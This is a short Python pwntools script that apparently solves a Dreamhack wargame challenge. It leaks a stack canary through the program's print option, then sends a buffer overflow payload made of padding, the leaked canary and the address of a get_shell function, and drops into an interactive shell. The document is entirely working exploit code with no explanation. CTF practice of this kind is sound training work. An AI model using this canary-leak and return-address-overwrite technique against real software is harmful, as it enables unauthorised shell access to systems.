from pwn import *

r = remote("host3.dreamhack.games",8205)

get_shell = 0x80486b9
canary = b''
context.arch = "amd64"

for i in range(0x83, 0x7f,-1):
	r.sendline(b'P')
	r.sendline(str(i))
	r.recvuntil(b'is : ')
	canary += r.recv(2)

canary = int(canary, 16)
print(hex(canary))

r.sendline(b'E')
r.sendline(b'200')

code = b'A'*0x40
code += p32(canary)
code += b'B'* 8
code += p32(get_shell)

r.send(code)
r.interactive()
